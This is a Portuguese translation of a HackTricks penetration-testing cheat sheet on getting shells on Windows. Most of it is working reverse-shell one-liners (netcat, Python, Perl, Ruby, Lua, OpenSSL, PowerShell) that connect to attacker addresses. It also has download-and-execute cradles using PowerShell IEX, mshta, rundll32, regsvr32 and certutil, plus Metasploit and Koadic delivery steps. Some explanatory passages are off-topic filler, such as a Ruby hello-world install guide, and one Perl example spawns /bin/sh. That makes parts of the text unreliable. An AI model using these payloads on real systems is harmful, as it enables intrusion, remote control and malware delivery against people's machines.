# Shells - Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que são mais importantes para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha de tecnologia, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

A página [lolbas-project.github.io](https://lolbas-project.github.io/) é para o Windows, assim como [https://gtfobins.github.io/](https://gtfobins.github.io/) é para o Linux.\
Obviamente, **não existem arquivos SUID ou privilégios sudo no Windows**, mas é útil saber **como** alguns **binários** podem ser (abusados) para executar algum tipo de ação inesperada, como **executar código arbitrário**.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** é um clone do Netcat, projetado para ser portátil e oferecer criptografia forte. Ele roda em sistemas operacionais semelhantes ao Unix e no Microsoft Win32. sbd possui criptografia AES-CBC-128 + HMAC-SHA1 (por Christophe Devine), execução de programas (opção -e), escolha da porta de origem, reconexão contínua com atraso e outras funcionalidades interessantes. sbd suporta apenas comunicação TCP/IP. O sbd.exe (parte da distribuição Kali Linux: /usr/share/windows-resources/sbd/sbd.exe) pode ser enviado para um computador com Windows como uma alternativa ao Netcat.

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
Perl é uma linguagem de programação de script de alto nível e interpretada. É amplamente utilizada para automação de tarefas, processamento de texto e desenvolvimento de aplicativos web. O Perl possui uma sintaxe flexível e poderosa, o que o torna uma escolha popular entre os hackers.

### Shells Perl

Existem várias shells Perl disponíveis para uso durante um teste de penetração. Essas shells fornecem uma interface interativa para executar comandos no sistema alvo. Aqui estão algumas shells Perl comumente usadas:

#### 1. Perl Reverse Shell

A Perl Reverse Shell é uma shell que se conecta a um servidor remoto e permite ao hacker executar comandos no sistema alvo. Ela é útil para estabelecer uma conexão reversa e obter acesso persistente ao sistema.

#### 2. Perl Bind Shell

A Perl Bind Shell é uma shell que escuta em uma porta específica no sistema alvo e aguarda uma conexão de um hacker. Uma vez conectado, o hacker pode executar comandos no sistema alvo. Essa shell é útil quando o sistema alvo está atrás de um firewall ou não tem acesso direto à Internet.

### Exemplo de Uso

Aqui está um exemplo de como usar a Perl Reverse Shell:

```perl
use Socket;
use FileHandle;

$ip = "192.168.0.1";
$port = 4444;

$proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
connect(SOCKET, sockaddr_in($port, inet_aton($ip)));

open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");

system("/bin/sh -i");
```

Neste exemplo, o hacker especifica o endereço IP e a porta do servidor remoto. A shell Perl se conecta ao servidor remoto e redireciona as entradas e saídas padrão para a conexão. Em seguida, o hacker pode executar comandos no sistema alvo.

### Considerações Finais

As shells Perl são ferramentas poderosas para hackers durante um teste de penetração. Elas permitem a execução de comandos no sistema alvo e podem ser usadas para obter acesso persistente. No entanto, é importante lembrar que o uso de shells Perl para fins maliciosos é ilegal e antiético.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby é uma linguagem de programação dinâmica, orientada a objetos e de código aberto. É conhecida por sua sintaxe simples e expressiva, o que a torna fácil de ler e escrever. Ruby é frequentemente usado para desenvolvimento web e scripting.

### Instalação do Ruby

Para começar a usar o Ruby, você precisa instalá-lo em seu sistema. Siga as etapas abaixo para instalar o Ruby em um ambiente Windows:

1. Baixe o instalador do Ruby para Windows no site oficial do Ruby (https://www.ruby-lang.org/pt/downloads/).
2. Execute o instalador e siga as instruções na tela para concluir a instalação.
3. Após a instalação, abra o prompt de comando e digite `ruby -v` para verificar se o Ruby foi instalado corretamente. Você deve ver a versão do Ruby instalada.

### Executando um script Ruby

Depois de instalar o Ruby, você pode executar scripts Ruby usando o prompt de comando. Siga as etapas abaixo para executar um script Ruby:

1. Crie um novo arquivo com a extensão `.rb`, por exemplo, `meu_script.rb`.
2. Abra o arquivo em um editor de texto e escreva seu código Ruby.
3. Salve o arquivo e feche o editor de texto.
4. Abra o prompt de comando e navegue até o diretório onde o arquivo `.rb` está localizado.
5. Digite `ruby meu_script.rb` no prompt de comando e pressione Enter para executar o script Ruby.

### Exemplo de script Ruby

Aqui está um exemplo simples de um script Ruby que exibe uma mensagem na tela:

```ruby
puts "Olá, mundo!"
```

Salve o código acima em um arquivo chamado `meu_script.rb` e execute-o usando o prompt de comando. Você verá a mensagem "Olá, mundo!" impressa na tela.

### Conclusão

Ruby é uma linguagem de programação poderosa e fácil de aprender. Com a instalação correta e um editor de texto, você pode começar a escrever e executar scripts Ruby em pouco tempo. Experimente e divirta-se explorando o mundo da programação com Ruby!
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua é uma linguagem de programação leve, poderosa e fácil de aprender. É frequentemente usada para scripting em jogos, aplicativos móveis e sistemas embarcados. Lua é conhecida por sua simplicidade, eficiência e flexibilidade.

### Características do Lua

- **Simplicidade**: Lua possui uma sintaxe simples e clara, o que a torna fácil de aprender e usar.
- **Eficiência**: Lua é projetada para ser rápida e eficiente, com um tempo de execução leve e um coletor de lixo eficiente.
- **Flexibilidade**: Lua é altamente flexível e pode ser estendida com facilidade através de bibliotecas e módulos personalizados.
- **Portabilidade**: Lua é uma linguagem portátil e pode ser executada em uma ampla variedade de plataformas, incluindo Windows, Linux e macOS.

### Usando Lua para hacking

Lua pode ser uma ferramenta útil para hackers devido à sua flexibilidade e facilidade de uso. Aqui estão algumas maneiras pelas quais Lua pode ser usado no contexto de hacking:

- **Scripting**: Lua pode ser usado para escrever scripts que automatizam tarefas repetitivas, como a exploração de vulnerabilidades ou a coleta de informações.
- **Manipulação de dados**: Lua possui recursos poderosos para manipulação de dados, como expressões regulares e estruturas de dados flexíveis, o que pode ser útil para analisar e extrair informações de arquivos ou bancos de dados.
- **Integração com outras ferramentas**: Lua pode ser facilmente integrada com outras ferramentas e linguagens de programação, permitindo que os hackers aproveitem a funcionalidade existente e estendam suas capacidades.
- **Desenvolvimento de exploits**: Lua pode ser usado para desenvolver exploits e payloads personalizados, aproveitando suas capacidades de scripting e manipulação de dados.

Lua é uma linguagem versátil que pode ser usada de várias maneiras no contexto de hacking. Com sua simplicidade e flexibilidade, é uma ferramenta poderosa para hackers que desejam automatizar tarefas, manipular dados e desenvolver exploits personalizados.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Atacante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Shells Windows

## Introdução

Um shell é um programa que permite aos usuários interagir com o sistema operacional. No contexto de hacking, um shell é usado para obter acesso remoto a um sistema alvo. Existem várias técnicas e recursos disponíveis para obter um shell em sistemas Windows.

## Técnicas Genéricas

### Reverse Shell

Um reverse shell é uma técnica em que o atacante cria uma conexão de rede reversa entre o sistema alvo e o sistema controlado pelo atacante. Isso permite que o atacante execute comandos no sistema alvo remotamente. Existem várias ferramentas disponíveis para criar um reverse shell em sistemas Windows, como o Netcat e o Metasploit.

### Web Shells

As web shells são scripts ou programas que são implantados em um servidor web comprometido. Eles fornecem uma interface baseada na web para executar comandos no servidor comprometido. Existem várias web shells disponíveis para sistemas Windows, como o WSO Shell e o China Chopper.

### Exploits

Os exploits são vulnerabilidades específicas que podem ser exploradas para obter acesso não autorizado a um sistema. Existem vários exploits disponíveis para sistemas Windows, como o EternalBlue, que explora uma vulnerabilidade no protocolo SMBv1.

## Recursos

### Metasploit Framework

O Metasploit Framework é uma ferramenta de código aberto amplamente utilizada para testes de penetração. Ele fornece uma ampla gama de módulos e exploits para explorar vulnerabilidades em sistemas Windows e obter acesso remoto.

### PowerShell Empire

O PowerShell Empire é uma estrutura de pós-exploração de código aberto que permite aos hackers manter o acesso persistente a sistemas Windows comprometidos. Ele fornece uma variedade de módulos para executar várias atividades maliciosas, como obter um shell reverso e roubar credenciais.

### Cobalt Strike

O Cobalt Strike é uma plataforma comercial de testes de penetração que oferece recursos avançados para hackers. Ele fornece uma variedade de técnicas para obter acesso remoto a sistemas Windows, como o uso de web shells e a exploração de vulnerabilidades.

## Conclusão

Obter um shell em sistemas Windows é uma etapa crucial no processo de hacking. Existem várias técnicas e recursos disponíveis para alcançar esse objetivo. É importante entender essas técnicas e recursos para realizar testes de penetração eficazes e garantir a segurança dos sistemas.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

O PowerShell é uma poderosa ferramenta de linha de comando e linguagem de script desenvolvida pela Microsoft. Ele foi projetado para automatizar tarefas administrativas e fornecer uma interface de linha de comando mais avançada para o sistema operacional Windows.

### Introdução ao Powershell

O PowerShell é baseado no framework .NET e usa uma sintaxe semelhante ao C#. Ele permite que os administradores executem comandos e scripts para gerenciar e automatizar tarefas no sistema operacional Windows.

### Executando comandos no Powershell

Para executar um comando no PowerShell, basta digitar o nome do comando seguido de quaisquer argumentos necessários. Por exemplo, para exibir a lista de processos em execução, você pode usar o comando `Get-Process`.

```
Get-Process
```

### Executando scripts no Powershell

Além de executar comandos individuais, o PowerShell também permite a execução de scripts completos. Os scripts no PowerShell são arquivos de texto com a extensão `.ps1`. Para executar um script, basta digitar o caminho para o arquivo do script no prompt de comando do PowerShell.

```
.\meu_script.ps1
```

### Automatizando tarefas com o Powershell

Uma das principais vantagens do PowerShell é a capacidade de automatizar tarefas repetitivas. Com o PowerShell, você pode escrever scripts que executam uma série de comandos em sequência, permitindo que você automatize tarefas complexas.

### Acesso remoto com o Powershell

O PowerShell também suporta acesso remoto a outros sistemas. Isso permite que você execute comandos e scripts em computadores remotos, facilitando a administração de sistemas distribuídos.

### Conclusão

O PowerShell é uma ferramenta poderosa para administradores de sistemas Windows. Com sua sintaxe semelhante ao C# e suporte a automação de tarefas, ele oferece uma maneira eficiente de gerenciar e automatizar tarefas no sistema operacional Windows.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Processo realizando chamada de rede: **powershell.exe**\
Carga gravada no disco: **NÃO** (_pelo menos em nenhum lugar que eu pudesse encontrar usando o procmon!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

**Em uma linha:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
O comando `mshta` é uma ferramenta do Windows que permite executar arquivos HTML como aplicativos. Essa funcionalidade pode ser explorada por hackers para executar código malicioso no sistema alvo. O `mshta` pode ser usado para contornar as restrições de segurança do Windows e executar comandos arbitrários.

### Sintaxe

```
mshta <URL>
```

### Exemplo

```
mshta http://www.example.com/malicious.hta
```

Neste exemplo, o `mshta` é usado para executar o arquivo `malicious.hta` hospedado no site `www.example.com`. O arquivo `malicious.hta` pode conter código malicioso que será executado no sistema alvo.

### Detecção e Prevenção

Devido ao potencial de abuso do `mshta`, é importante implementar medidas de segurança para detectar e prevenir seu uso malicioso. Algumas práticas recomendadas incluem:

- Manter o sistema operacional e os aplicativos atualizados com as últimas correções de segurança.
- Utilizar soluções de segurança, como antivírus e firewalls, para detectar e bloquear atividades maliciosas.
- Restringir o acesso a URLs suspeitas ou não confiáveis.
- Monitorar o tráfego de rede em busca de atividades suspeitas.
- Implementar políticas de segurança que limitem a execução de arquivos HTA.

### Recursos Adicionais

Para obter mais informações sobre diferentes shells do Powershell, consulte os seguintes recursos:

- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Mitre ATT&CK - Execution](https://attack.mitre.org/tactics/TA0002/)
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
Processo realizando chamada de rede: **mshta.exe**\
Carga gravada no disco: **cache local do IE**
```bash
mshta http://webserver/payload.hta
```
Processo realizando chamada de rede: **mshta.exe**\
Carga gravada no disco: **cache local do IE**
```bash
mshta \\webdavserver\folder\payload.hta
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

#### **Exemplo de shell reverso hta-psh (usa hta para baixar e executar backdoor PS)**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Você pode baixar e executar facilmente um zombie Koadic usando o stager hta**

#### Exemplo hta
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

O comando `mshta` é uma ferramenta do Windows que permite executar arquivos HTML como aplicativos. Essa funcionalidade pode ser explorada para executar scripts maliciosos em um alvo.

A extensão `.sct` é usada para arquivos de script do Windows. Esses arquivos contêm código VBScript ou JScript que pode ser executado pelo `mshta`.

Para criar um arquivo `.sct` malicioso, você pode usar o seguinte código:

```html
<job id="test">
<script>
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe", 0, true);
</script>
</job>
```

Salve o código acima em um arquivo com a extensão `.sct` (por exemplo, `malicious.sct`).

Para executar o arquivo `.sct`, use o seguinte comando:

```
mshta.exe javascript:a=new%20ActiveXObject("Scripting.FileSystemObject");b=a.GetStandardStream(1);c=a.CreateTextFile("C:\\Windows\\Temp\\malicious.sct",true);c.WriteLine('<?xml version="1.0"?>');c.WriteLine('<scriptlet>');c.WriteLine('<registration');c.WriteLine('    description="Test"');c.WriteLine('    progid="Test"');c.WriteLine('    version="1.00"');c.WriteLine('    classid="{AAAA1111-1111-1111-1111-111111111111}"');c.WriteLine('    remotable="True"');c.WriteLine('/>');c.WriteLine('<public>');c.WriteLine('    <method');c.WriteLine('        name="Exec"');c.WriteLine('        dispId="0"');c.WriteLine('        description="Exec"');c.WriteLine('    />');c.WriteLine('</public>');c.WriteLine('<script language="VBScript">');c.WriteLine('    Sub Exec');c.WriteLine('        Set objShell = CreateObject("WScript.Shell")');c.WriteLine('        objShell.Run "mshta.exe C:\\Windows\\Temp\\malicious.sct", 0, True');c.WriteLine('    End Sub');c.WriteLine('</script>');c.WriteLine('</scriptlet>');c.Close();b.Write(c.Path);b.Close();
```

Isso criará um arquivo `.sct` malicioso no diretório `C:\Windows\Temp` e o executará usando o `mshta`.

Lembre-se de que o uso de técnicas de hacking sem autorização é ilegal e pode resultar em consequências legais graves.
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a Microsoft utility that allows the execution of HTML applications (HTAs) on Windows systems. It is often used by attackers to bypass security measures and execute malicious code.

Metasploit, a popular penetration testing framework, includes a module that leverages mshta to deliver payloads to target systems. This module, called "exploit/windows/browser/mshta", allows an attacker to create a malicious HTA file and deliver it to a victim's system.

To use this module, the attacker needs to set the "SRVHOST" and "SRVPORT" options to specify the IP address and port where the payload will be hosted. The "URIPATH" option can be used to specify a custom URI path for the payload.

Once the options are set, the attacker can run the exploit by executing the "exploit" command. This will start a web server that hosts the malicious HTA file. When the victim opens the file, the payload will be executed on their system.

It is important to note that the mshta utility may trigger security alerts, as it is commonly used in malicious activities. Therefore, it is crucial to use this technique responsibly and only in authorized penetration testing scenarios.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Detectado pelo defensor**

## **Rundll32**

[**Exemplo de DLL hello world**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
Processo realizando chamada de rede: **rundll32.exe**\
Carga gravada no disco: **cache local do IE**

**Detectado pelo defensor**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

O comando `rundll32` é uma ferramenta do Windows que permite executar funções em bibliotecas de vínculo dinâmico (DLLs). No contexto do Metasploit, podemos usar o `rundll32` para carregar uma DLL maliciosa e executar um payload.

Aqui está um exemplo de como usar o `rundll32` com o Metasploit:

1. Crie um payload do Metasploit usando o msfvenom:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f dll > payload.dll
```

2. Inicie um listener do Metasploit para receber a conexão reversa:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <seu endereço IP>
set LPORT <sua porta>
exploit
```

3. No computador de destino, execute o seguinte comando para carregar a DLL maliciosa e executar o payload:

```
rundll32 payload.dll, <nome da função>
```

Certifique-se de substituir `<nome da função>` pelo nome da função exportada pela DLL maliciosa.

O `rundll32` é uma ferramenta poderosa que pode ser usada para executar payloads maliciosos no Windows. No entanto, é importante lembrar que o uso indevido dessa ferramenta é ilegal e pode resultar em consequências legais graves. Portanto, sempre use essas técnicas apenas para fins educacionais e com permissão adequada.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by hackers to load malicious DLLs and execute their code. One popular tool that utilizes this technique is Koadic.

Koadic is a post-exploitation RAT (Remote Access Trojan) that provides a command and control (C2) framework for Windows systems. It allows hackers to gain remote access to compromised machines and perform various malicious activities.

To use Koadic, the attacker first needs to generate a malicious DLL payload using the Koadic framework. This payload is then loaded using the Rundll32 utility, which executes the DLL's entry point function. Once executed, the malicious code establishes a connection with the attacker's C2 server, enabling them to control the compromised system remotely.

This technique can be used for various purposes, such as stealing sensitive information, executing commands, or even pivoting to other systems within the network. It is important for system administrators to be aware of this technique and take appropriate measures to prevent its exploitation, such as implementing strong access controls and regularly patching vulnerabilities.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

O comando `regsvr32` é uma ferramenta do Windows que permite registrar e desregistrar bibliotecas de vínculo dinâmico (DLLs) e controles ActiveX no sistema operacional. Essa ferramenta é comumente usada por hackers para executar código malicioso em um sistema comprometido.

### Uso básico

Para registrar uma DLL usando o `regsvr32`, você pode usar o seguinte comando:

```
regsvr32 <caminho_para_dll>
```

Para desregistrar uma DLL, você pode usar o seguinte comando:

```
regsvr32 /u <caminho_para_dll>
```

### Uso malicioso

Os hackers podem explorar o `regsvr32` para executar código malicioso em um sistema comprometido. Eles podem criar uma DLL maliciosa e registrá-la usando o comando `regsvr32`. Quando a DLL é registrada, o código malicioso é executado automaticamente sempre que o sistema é reiniciado.

### Detecção e prevenção

Para detectar atividades maliciosas relacionadas ao `regsvr32`, é importante monitorar o registro do sistema em busca de alterações suspeitas. Além disso, é recomendável manter o sistema operacional e os aplicativos atualizados para evitar vulnerabilidades conhecidas que possam ser exploradas por hackers.

### Conclusão

O `regsvr32` é uma ferramenta poderosa do Windows que pode ser usada tanto para fins legítimos quanto maliciosos. É importante estar ciente de como essa ferramenta pode ser explorada por hackers e tomar medidas adequadas para proteger seu sistema contra possíveis ataques.
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
Processo realizando chamada de rede: **regsvr32.exe**\
Carga gravada no disco: **cache local do IE**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

**Detectado pelo Defender**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

O comando `regsvr32` é uma ferramenta do Windows que permite registrar e desregistrar bibliotecas de vínculo dinâmico (DLLs) e controles ActiveX no sistema operacional. No entanto, essa ferramenta também pode ser explorada por hackers para executar código malicioso no sistema alvo.

O Metasploit Framework, uma das ferramentas mais populares para testes de penetração, possui um módulo chamado `exploit/windows/local/regsvr32_applocker_bypass` que aproveita uma vulnerabilidade no `regsvr32` para contornar as restrições do AppLocker e executar payloads arbitrários.

Esse módulo permite que um invasor execute comandos arbitrários no contexto do usuário atual, o que pode levar à execução remota de código e controle total do sistema comprometido.

Para usar esse módulo, é necessário ter acesso ao Metasploit Framework e conhecimento sobre como configurar e executar um payload específico.

**Exemplo de uso:**

```
use exploit/windows/local/regsvr32_applocker_bypass
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <seu endereço IP>
set LPORT <sua porta>
run
```

Nesse exemplo, o módulo `regsvr32_applocker_bypass` é usado em conjunto com o payload `windows/meterpreter/reverse_tcp` para estabelecer uma conexão reversa com o sistema alvo.

É importante ressaltar que o uso de técnicas de hacking como essa é ilegal sem autorização prévia e pode resultar em consequências legais graves. Portanto, é fundamental utilizar essas técnicas apenas para fins educacionais ou em um ambiente controlado e autorizado.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Você pode baixar e executar facilmente um zombie Koadic usando o stager regsvr**

## Certutil

Baixe um B64dll, decodifique-o e execute-o.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Baixe um arquivo B64exe, decodifique-o e execute-o.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Detectado pelo defensor**


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

